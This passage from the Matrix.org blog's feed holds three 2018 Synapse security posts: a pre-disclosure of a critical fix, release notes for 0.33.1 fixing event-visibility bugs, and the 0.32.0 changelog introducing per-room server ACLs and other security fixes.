		<title>Pre-disclosure: Upcoming critical security fix for Synapse</title>
		<published>2018-09-05T00:00:00+00:00</published>
		<updated>2018-09-05T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2018/09/05/pre-disclosure-upcoming-critical-security-fix-for-synapse/" type="text/html"/>
		<id>/blog/2018/09/05/pre-disclosure-upcoming-critical-security-fix-for-synapse/</id>
		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;During the ongoing work to finalise a stable release of Matrix&#x27;s Server-Server federation API, we&#x27;ve been doing a full audit of Synapse&#x27;s implementation and have identified a serious vulnerability which we are going to release a security update to address (Synapse 0.33.3.1) on 
&lt;b&gt;Thursday Sept 6th 2018 at 12:00 UTC&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We are coordinating with package maintainers to ensure that patched versions of packages will be available at that time - meanwhile, if you run your own Synapse, &lt;strong&gt;please be prepared to upgrade as soon as the patched versions are released&lt;&#x2F;strong&gt;.  All previous versions of Synapse are affected, so everyone will want to upgrade.&lt;&#x2F;p&gt;
&lt;p&gt;Thank you for your time, patience and understanding while we resolve the issue,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;09&#x2F;signed_disclosure.txt&quot;&gt;signed_predisclosure.txt&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security update: Synapse 0.33.1</title>
		<published>2018-08-02T00:00:00+00:00</published>
		<updated>2018-08-02T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2018/08/02/security-update-synapse-0-33-1/" type="text/html"/>
		<id>/blog/2018/08/02/security-update-synapse-0-33-1/</id>
		<content type="html">&lt;p&gt;Hi All,&lt;&#x2F;p&gt;
&lt;p&gt;We have patched two securities vulnerabilities (details follow), we do not believe either have been exploited in the wild, but recommend upgrading asap.&lt;&#x2F;p&gt;
&lt;p&gt;As always you can get the new update from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.33.1&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.33.1&lt;&#x2F;a&gt; or from any of the sources mentioned at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thanks&lt;&#x2F;p&gt;
&lt;p&gt; &lt;&#x2F;p&gt;
&lt;h3&gt;Changes in Synapse v0.33.1 (2018-08-2)&lt;&#x2F;h3&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix a potential issue where servers could request events for rooms they have not joined. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3641&quot;&gt;#3641&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix a potential issue where users could see events in private rooms before they joined. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3642&quot;&gt;#3642&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security update: Synapse 0.32.0</title>
		<published>2018-07-06T00:00:00+00:00</published>
		<updated>2018-07-06T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2018/07/06/security-update-synapse-0-32-0/" type="text/html"/>
		<id>/blog/2018/07/06/security-update-synapse-0-32-0/</id>
		<content type="html">&lt;p&gt;Folks, Synapse 0.32.0 is an important security update: please upgrade as soon as you can.&lt;&#x2F;p&gt;
&lt;p&gt;The release focuses on security; fixing several federation bugs and adding new features for countering abuse. Notably it includes the ability to blacklist &amp;amp; whitelist servers allowed to send events to a room on a per-room basis via the new 
m.room.server_acl
state event: see &lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;1aiuROf1__7ZFkJvDdAZQfBNxyzjYd-ijiRAcHJYqJCM&#x2F;edit&quot;&gt;MSC1383&lt;&#x2F;a&gt; for details.  This also closes out &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;709&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;709&lt;&#x2F;a&gt; - one of our oldest feature requests from users who wish to be able to limit the servers allowed to participate in a given room.&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s important to understand that server ACLs only work if all the servers participating in the room honour them.  In future this will be handled better (as part of ongoing work in making it easier to incrementally version and upgrade the federation protocol).  This means that for the ACLs to work, any servers which don&#x27;t yet implement ACLs (e.g. older Synapses) have to be ACL&#x27;d from the room for the access control to work.  
&lt;b&gt;Therefore please upgrade as soon as possible to avoid this problem.&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This ongoing flurry of security work is in general all part of moving towards the long-awaited stable release of the Server-Server API. In parallel we&#x27;ve been working on the other main outstanding point: State Resets (i.e. scenarios where you get unexpected results when resolving conflicts between different servers&#x27; copies of a room).  There will be a few more major changes and upgrades on the horizon as we fix these, but then we&#x27;ll finally be able to cut an r0 release of the Server-Server API and Matrix will be one massive step closer to being out of beta!&lt;&#x2F;p&gt;
&lt;p&gt;As always, you can get the new update from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.32.1&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.32.1&lt;&#x2F;a&gt;
 or any of the sources mentioned at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h2&gt;Changes in synapse v0.32.0 (2018-07-06)&lt;&#x2F;h2&gt;
No changes since 0.32.0rc1
&lt;h2&gt;Synapse 0.32.0rc1 (2018-07-05)&lt;&#x2F;h2&gt;
&amp;nbsp;
&lt;h4&gt;Features&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;Add blacklist &amp;amp; whitelist of servers allowed to send events to a
room via &lt;code&gt;m.room.server_acl&lt;&#x2F;code&gt; event. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;feef8461d19c51f3766471e17e2a2f8a2b36c785&quot;&gt;merge&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Cache factor override system for specific caches (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3334&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329021103&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3334&quot;&gt;#3334&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add metrics to track appservice transactions (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3344&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329432100&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3344&quot;&gt;#3344&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Try to log more helpful info when a sig verification fails
(&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3372&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;330617906&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3372&quot;&gt;#3372&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Synapse now uses the best performing JSON encoder&#x2F;decoder according
to your runtime (simplejson on CPython, stdlib json on PyPy).
(&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3462&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;336619861&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3462&quot;&gt;#3462&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add optional ip_range_whitelist param to AS registration files to
lock AS IP access (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3465&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;336751400&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3465&quot;&gt;#3465&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Reject invalid server names in federation requests (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3480&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;337874054&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3480&quot;&gt;#3480&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Reject invalid server names in homeserver.yaml (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3483&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;338348899&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3483&quot;&gt;#3483&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4&gt;Bugfixes&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;Strip access_token from outgoing requests (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3327&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;328782473&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3327&quot;&gt;#3327&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Redact AS tokens in logs (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3349&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329791545&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3349&quot;&gt;#3349&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix federation backfill from SQLite servers (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3355&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329865615&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3355&quot;&gt;#3355&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix event-purge-by-ts admin API (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3363&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;330065602&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3363&quot;&gt;#3363&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix event filtering in get_missing_events handler (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3371&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;330608172&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3371&quot;&gt;#3371&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Synapse is now stricter regarding accepting events which it cannot
retrieve the prev_events for. (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3456&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;336184658&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3456&quot;&gt;#3456&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where synapse would explode when receiving unicode in HTTP
User-Agent header (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3470&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;337261723&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3470&quot;&gt;#3470&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Invalidate cache on correct thread to avoid race (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3473&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;337463703&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3473&quot;&gt;#3473&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4&gt;Improved Documentation&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;code&gt;doc&#x2F;postgres.rst&lt;&#x2F;code&gt;: fix display of the last command block. Thanks to
&lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ArchangeGabriel&quot; data-hovercard-user-id=&quot;490531&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; aria-describedby=&quot;hovercard-aria-description&quot;&gt;@ArchangeGabriel&lt;&#x2F;a&gt;! (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3340&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329241972&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3340&quot;&gt;#3340&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4&gt;Deprecations and Removals&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;Remove was_forgotten_at (&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3324&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;328600145&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3324&quot;&gt;#3324&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4&gt;Misc&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3332&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;328922729&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3332&quot;&gt;#3332&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3341&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329315777&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3341&quot;&gt;#3341&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3347&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329626817&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3347&quot;&gt;#3347&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3348&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329660142&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3348&quot;&gt;#3348&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3356&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;329938222&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3356&quot;&gt;#3356&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3385&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;331533857&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3385&quot;&gt;#3385&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3446&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;335720791&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3446&quot;&gt;#3446&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3447&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;335727844&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3447&quot;&gt;#3447&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3467&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;336993276&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3467&quot;&gt;#3467&lt;&#x2F;a&gt; &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;3474&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;337465451&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3474&quot;&gt;#3474&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
</feed>
